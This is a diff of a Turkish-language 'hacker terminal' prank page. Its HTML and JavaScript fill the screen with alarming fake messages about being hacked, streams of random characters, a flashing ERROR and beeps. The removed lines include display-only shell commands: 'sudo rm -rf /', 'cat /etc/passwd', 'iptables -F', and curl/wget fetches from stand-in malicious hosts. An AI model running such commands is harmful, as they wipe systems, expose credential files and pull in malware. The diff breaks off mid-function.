@@ -3,237 +3,274 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Zero Day Terminal Sim</title>
+<title>Zero-Day Sim Terminal</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-  body {
-    margin:0; padding:0; background:black; color:#0f0; font-family: 'Share Tech Mono', monospace;
-    overflow: hidden;
+  * {
+    margin: 0; padding: 0; box-sizing: border-box;
   }
-  #startBox {
-    position: fixed;
-    top:50%; left:50%;
-    transform: translate(-50%, -50%);
-    background: #111;
-    border: 2px solid #0f0;
-    padding: 20px 40px;
-    font-size: 2rem;
-    color: #0f0;
-    user-select:none;
-    z-index: 10;
-    display: flex;
-    align-items: center;
-    gap: 20px;
-    border-radius: 8px;
-  }
-  #closeBtn {
-    cursor: pointer;
-    font-weight: bold;
-    font-size: 2rem;
-    color: #0f0;
-    user-select:none;
-  }
-  #terminalArea {
-    position: fixed;
-    top:0; left:0; right:0; bottom:0;
+  body, html {
+    height: 100%;
     background: black;
-    display: none;
-    overflow: hidden;
-  }
-  .textLayer {
-    position: absolute;
+    color: #0f0;
     font-family: 'Share Tech Mono', monospace;
-    white-space: pre-wrap;
-    user-select:none;
-    pointer-events:none;
+    overflow: hidden;
+    user-select: none;
   }
-  #redText {
-    top: 5vh; left: 5vw;
-    color: #f33;
-    font-size: 1.1rem;
-    width: 40vw;
-    height: 90vh;
-    overflow-y: auto;
-  }
-  #greenText {
-    bottom: 5vh; left: 55vw;
-    color: #0f0;
-    font-size: 1.1rem;
-    width: 40vw;
-    height: 50vh;
-    overflow-y: auto;
-  }
-  #whiteText {
-    bottom: 0; left: 0;
-    color: #eee;
-    font-size: 0.9rem;
-    width: 100vw;
-    height: 30vh;
-    overflow-y: auto;
-    background: black;
-  }
-  #errorBox {
+  #introBox {
     position: fixed;
     top: 50%; left: 50%;
     transform: translate(-50%, -50%);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 4rem;
+    background: #111;
+    border: 2px solid #0f0;
+    padding: 20px 50px 20px 20px;
+    font-size: 2.2rem;
+    color: #0f0;
+    letter-spacing: 2px;
+    box-shadow: 0 0 15px #0f0;
+    display: flex;
+    align-items: center;
+    z-index: 9999;
+  }
+  #closeBtn {
+    cursor: pointer;
     color: #f00;
-    text-transform: uppercase;
     font-weight: bold;
+    font-size: 1.8rem;
+    margin-left: 15px;
+    border: 2px solid #f00;
+    padding: 0 8px 4px 8px;
+    border-radius: 4px;
+    user-select: none;
+  }
+  #terminalBg {
+    position: fixed;
+    top: 0; left: 0; right:0; bottom: 0;
+    background: black;
+    overflow: hidden;
+    z-index: 1;
+  }
+  .lineSet {
+    position: absolute;
+    width: 100%;
+    font-size: 0.85rem;
+    font-weight: 600;
+    white-space: nowrap;
+    overflow: hidden;
+    pointer-events: none;
+  }
+  #redLines {
+    top: 10%;
+    left: 0;
+    color: #ff2b2b;
+    letter-spacing: 1.2px;
+  }
+  #greenLines {
+    top: 50%;
+    left: 0;
+    color: #2bff58;
+    letter-spacing: 1.2px;
+  }
+  #whiteLines {
+    top: 90%;
+    left: 0;
+    color: #eee;
+    letter-spacing: 1.2px;
+  }
+  .terminalBox {
+    position: fixed;
+    background: #000;
+    border: 2px solid #0f0;
+    font-family: 'Share Tech Mono', monospace;
+    color: #0f0;
+    font-size: 0.9rem;
+    padding: 8px 10px;
+    box-shadow: 0 0 8px #0f0;
+    overflow-y: auto;
+    overflow-x: hidden;
+    white-space: pre-wrap;
+    z-index: 999;
+  }
+  /* Kutular pozisyonları */
+  #term1 { top: 20%; left: 5%; width: 30%; height: 35%; }
+  #term2 { top: 25%; right: 5%; width: 22%; height: 30%; border-color: #f00; color: #f00; box-shadow: 0 0 10px #f00;}
+  #term3 { top: 60%; left: 10%; width: 20%; height: 25%; border-color: #eee; color: #eee; box-shadow: 0 0 8px #eee;}
+  #term4 { top: 60%; right: 15%; width: 25%; height: 30%; border-color: #2bff58; color: #2bff58; box-shadow: 0 0 10px #2bff58;}
+  #errorOverlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: black;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 10000;
+    pointer-events: none;
+  }
+  #errorText {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 6rem;
+    font-weight: 900;
+    color: #f00;
     text-shadow:
-       0 0 5px #f00,
-       0 0 10px #f00,
-       0 0 20px #f00,
-       0 0 40px #ff0000,
-       0 0 80px #ff0000;
-    display: none;
-    user-select:none;
-    z-index: 100;
+      0 0 5px #f00,
+      0 0 10px #f00,
+      0 0 20px #ff0000,
+      0 0 40px #ff0000,
+      0 0 80px #ff0000;
+    animation: flicker 1.5s infinite alternate;
+    user-select: none;
+  }
+  /* Yanıp sönme animasyonu */
+  @keyframes flicker {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.2; }
+  }
+  /* Ünlem işaretleri */
+  #exclamations {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    pointer-events: none;
+    overflow: hidden;
+    z-index: 9999;
+  }
+  .exclMark {
+    position: absolute;
+    font-size: 3rem;
+    color: #f00;
+    text-shadow: 0 0 5px #f00;
+    user-select: none;
+    animation-name: moveExcl;
+    animation-timing-function: linear;
+    animation-iteration-count: infinite;
+  }
+  @keyframes moveExcl {
+    0% {
+      transform: translateY(-100%);
+      opacity: 1;
+    }
+    100% {
+      transform: translateY(110vh);
+      opacity: 0;
+    }
   }
 </style>
 </head>
 <body>
 
-<div id="startBox">
+<div id="introBox">
   @mhmtxaslan
-  <div id="closeBtn" title="Başlat">×</div>
+  <div id="closeBtn" title="Başlat (Ses Aç/Kapa)">×</div>
 </div>
 
-<div id="terminalArea">
-  <div id="redText" class="textLayer"></div>
-  <div id="greenText" class="textLayer"></div>
-  <div id="whiteText" class="textLayer"></div>
+<div id="terminalBg" style="display:none;">
+  <div id="redLines" class="lineSet"></div>
+  <div id="greenLines" class="lineSet"></div>
+  <div id="whiteLines" class="lineSet"></div>
+
+  <div id="term1" class="terminalBox"></div>
+  <div id="term2" class="terminalBox"></div>
+  <div id="term3" class="terminalBox"></div>
+  <div id="term4" class="terminalBox"></div>
 </div>
 
-<div id="errorBox">ERROR</div>
+<div id="errorOverlay" style="display:none;">
+  <div id="errorText">ERROR</div>
+</div>
 
-<audio id="beepAudio" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
+<div id="exclamations"></div>
+
+<audio id="beepSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
 
 <script>
-  const startBox = document.getElementById('startBox');
+(() => {
+  const introBox = document.getElementById('introBox');
   const closeBtn = document.getElementById('closeBtn');
-  const terminalArea = document.getElementById('terminalArea');
-  const redText = document.getElementById('redText');
-  const greenText = document.getElementById('greenText');
-  const whiteText = document.getElementById('whiteText');
-  const errorBox = document.getElementById('errorBox');
-  const beepAudio = document.getElementById('beepAudio');
+  const terminalBg = document.getElementById('terminalBg');
+  const redLines = document.getElementById('redLines');
+  const greenLines = document.getElementById('greenLines');
+  const whiteLines = document.getElementById('whiteLines');
+  const term1 = document.getElementById('term1');
+  const term2 = document.getElementById('term2');
+  const term3 = document.getElementById('term3');
+  const term4 = document.getElementById('term4');
+  const errorOverlay = document.getElementById('errorOverlay');
+  const errorText = document.getElementById('errorText');
+  const exclamations = document.getElementById('exclamations');
+  const beepSound = document.getElementById('beepSound');
 
-  // Korkutucu Türkçe yazılar örnekleri (kendi ekle istersen)
-  const redLines = [
-    "HACKLENİYORSUN...",
-    "GİZLİ BİLGİLERİN ÇALINIYOR...",
-    "SİSTEME İZİNSİZ ERİŞİM TESPİT EDİLDİ",
-    "ŞİFRENİZ ELE GEÇİRİLDİ",
-    "VİRÜS BULAŞTIRILDI",
-    "FİREWALL DELİNDİ",
-    "SİSTEM KONTROLÜ KAYBEDİLDİ",
-    "VERİ TABANI YOK EDİLİYOR",
-    "SUNUCUYA SALDIRI BAŞLADI",
-    "DOSYALARINIZ ŞİFRELENDİ",
-  ];
-  const greenLines = [
-    "BAŞARILI GİRİŞ",
-    "VERİ AKIYOR",
-    "KOMUT ÇALIŞTIRILIYOR",
-    "AĞ BAĞLANTISI KURULDU",
-    "PROTOKOL SİLİNDİ",
-    "KONTROL SAĞLANDI",
-    "BAĞLANTI GÜÇLENDİRİLDİ",
-    "İŞLEM BAŞARIYLA TAMAMLANDI",
-    "ŞİFRE KIRILDI",
-    "BAĞLANTI KAPANDI",
-  ];
-  const whiteLines = [
-    "root@server:~$ sudo rm -rf /",
-    "iptables -F",
-    "ssh-keygen -R 192.168.1.1",
-    "netstat -an | grep ESTABLISHED",
-    "curl http://malicious.site/payload",
-    "chmod 777 hack.sh",
-    "echo 'Exploit çalıştırılıyor...'",
-    "cat /etc/passwd",
-    "sudo service ssh restart",
-    "wget http://badserver.com/malware",
+  let beepInterval = null;
+  let soundOn = true;
+  let started = false;
+
+  const horrorTexts = [
+    "Sistem çöktü!",
+    "Erişim reddedildi!",
+    "Veriler sızdırıldı!",
+    "Güvenlik ihlali tespit edildi!",
+    "Sunucu tehlikede!",
+    "Kritik hata oluştu!",
+    "Şifre kırıldı!",
+    "Hedef ele geçirildi!",
+    "Firewall devre dışı!",
+    "Backdoor açıldı!",
+    "Sistem kapanıyor...",
+    "Zararlı yazılım bulaştı!",
+    "Şüpheli giriş algılandı!",
+    "Saldırı devam ediyor!",
+    "Loglar siliniyor!",
+    "Veri tabanı hasar gördü!",
+    "İnternet kesildi!",
+    "Sistem yeniden başlatılıyor!",
+    "Parola kırıldı!",
+    "Hedef sunucu çöktü!",
   ];
 
-  function randomFromArray(arr) {
-    return arr[Math.floor(Math.random() * arr.length)];
+  function getRandomHorrorText() {
+    return horrorTexts[Math.floor(Math.random() * horrorTexts.length)];
   }
 
-  // Satır ekleme fonksiyonu
-  function addLines(container, lines, count, interval, callback) {
-    let added = 0;
-    const id = setInterval(() => {
-      container.textContent += randomFromArray(lines) + "\n";
-      container.scrollTop = container.scrollHeight;
-      added++;
-      if (added >= count) {
-        clearInterval(id);
-        if (callback) callback();
+  // 1. intro ve çarpı butonu
+  closeBtn.addEventListener('click', () => {
+    if (started) {
+      // Ses aç/kapa
+      if (soundOn) {
+        soundOn = false;
+        stopBeeps();
+      } else {
+        soundOn = true;
+        startBeeps();
       }
-    }, interval);
-  }
-
-  // Bip sesi art arda çalması için
-  function playBeeps(times, delay, callback) {
-    let count = 0;
-    const interval = setInterval(() => {
-      beepAudio.currentTime = 0;
-      beepAudio.play();
-      count++;
-      if (count >= times) {
-        clearInterval(interval);
-        if (callback) callback();
-      }
-    }, delay);
-  }
-
-  // Yanıp sönen arka plan için
-  let bgBlinkInterval;
-  function startBgBlink() {
-    let on = false;
-    bgBlinkInterval = setInterval(() => {
-      document.body.style.backgroundColor = on ? '#330000' : 'black';
-      on = !on;
-    }, 500);
-  }
-  function stopBgBlink() {
-    clearInterval(bgBlinkInterval);
-    document.body.style.backgroundColor = 'black';
-  }
-
-  // Başlatma fonksiyonu
-  function startTerminal() {
-    startBox.style.display = "none";
-    terminalArea.style.display = "block";
-
-    // 1000 satır gibi yazılar olacak, interval 30ms, toplam ~30 saniyede tamamlanacak
-    // Her renk ayrı alan, önce kırmızı sonra yeşil sonra beyaz olarak devam edecek.
-    // Kırmızı yazılar 350 satır, yeşil 350 satır, beyaz 300 satır (toplam 1000 satır)
-
-    addLines(redText, redLines, 350, 30, () => {});
-    addLines(greenText, greenLines, 350, 30, () => {});
-    addLines(whiteText, whiteLines, 300, 30, () => {});
-
-    // 20 saniye sonra ERROR ve bip başlat
-    setTimeout(() => {
-      errorBox.style.display = "block";
-      startBgBlink();
-      playBeeps(60, 500);
-    }, 20000);
-
-    // 30 saniye sonunda işlem biter
-    setTimeout(() => {
-      stopBgBlink();
-    }, 30000);
-  }
-
-  closeBtn.addEventListener("click", () => {
-    startTerminal();
+      return;
+    }
+    started = true;
+    introBox.style.display = 'none';
+    terminalBg.style.display = 'block';
+    startTerminalSequence();
   });
-</script>
 
-</body>
-</html>
+  // Yazı üretici (rastgele harf, rakam, noktalama)
+  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;':,.<>/?`~";
+
+  function randomChar() {
+    return chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+
+  // Yazı satırı üretici
+  function generateLine(length) {
+    let line = "";
+    for(let i=0; i<length; i++) {
+      line += randomChar();
+    }
+    return line;
+  }
+
+  // Hızlı yazı akışı fonksiyonu
+  function startLineStream(element, totalLines, colorOrder, intervalMs=10) {
+    let lineCount = 0;
+    const linesPerColor = Math.floor(totalLines / colorOrder.length);
+    let colors = colorOrder.slice();
+    let currentColorIndex = 0;
+    let currentColorLinesWritten = 0;
+
+    function writeLine() {
+      if (
